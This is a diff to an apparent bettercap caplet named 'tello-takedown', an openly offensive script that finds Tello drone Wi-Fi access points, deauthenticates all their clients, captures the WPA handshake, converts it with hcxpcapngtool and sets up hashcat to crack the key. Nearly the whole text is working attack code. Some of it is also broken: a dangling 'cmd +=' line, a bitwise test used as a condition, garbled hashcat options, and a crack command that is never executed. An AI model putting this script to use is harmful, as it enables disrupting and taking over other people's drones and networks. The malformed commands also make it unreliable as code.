@@ -1,3 +1,7 @@
+include("config");
+
+var target; // Target ap (drone) bssid
+
 log('📝 Script tello-takedown started');
 
 log('📝 Turning on wifi recon');
@@ -9,7 +13,7 @@ run('set wifi.show.limit 20')
 run('set ticker.commands "clear; wifi.show"');
 run('ticker on');*/
 
-// Polyfill for startsWith String function
+// Polyfill for "startsWith" String function
 if (!String.prototype.startsWith) {
     Object.defineProperty(String.prototype, 'startsWith', {
         value: function(search, rawPos) {
@@ -19,7 +23,7 @@ if (!String.prototype.startsWith) {
     });
 }
 
-// Polyfill for includes String function
+// Polyfill for "includes" String function
 if (!String.prototype.includes) {
   String.prototype.includes = function(search, start) {
     'use strict';
@@ -47,8 +51,12 @@ onEvent('wifi.ap.new', function(event){
     if(ap.hostname.startsWith('TELLO-')){
         log('🚁 Drone identified, homing in on channel ' + ap.channel);
         run('wifi.recon.channel ' + ap.channel);
+
+        log('🎯 Locked onto target : ' + ap.mac);
+        target = ap.mac;
+
         log('💀 Deauthing all clients, stand by...')
-        run('wifi.deauth ' + ap.mac);
+        run('wifi.deauth ' + target);
     }
 });
 
@@ -69,4 +77,25 @@ onEvent('wifi.client.handshake', function(event){
     log(' station: ' + data.station);
     log(' ap: ' + data.ap);
     log(' lat:' + gps.Latitude + ' lon:' + gps.Longitude + ' updated_at:' + gps.Updated.String());
+
+    if(data.full & target == data.ap) { //TODO: check this
+        log('📝 Target handshake data aquired, stopping wifi recon');
+        run('wifi.recon off'); // Stop wifi recon 
+
+        log('🪄 Converting packets to 22000 format');
+        cmd = hcxpcapngtool;
+        cmd += ' -o ' + hashcatFormat22000FileName;
+        cmd += //TODO: filter on ap mac address
+        cmd += ' ' + handshakesFileName;
+        run('!'+cmd);
+
+        log('🪅 Cracking hashes');
+        cmd = 'cd ' + hashcatHomePath;
+        cmd += ' && ' + hashcat;
+        cmd += ' -m 3 -a 3 -m 22000 -w' + wordlistFileName;
+        cmd += ' -o ' + hashcatOutputFileName;
+        cmd += ' ' + hashcatFormat22000FileName;
+
+        
+    }
 });
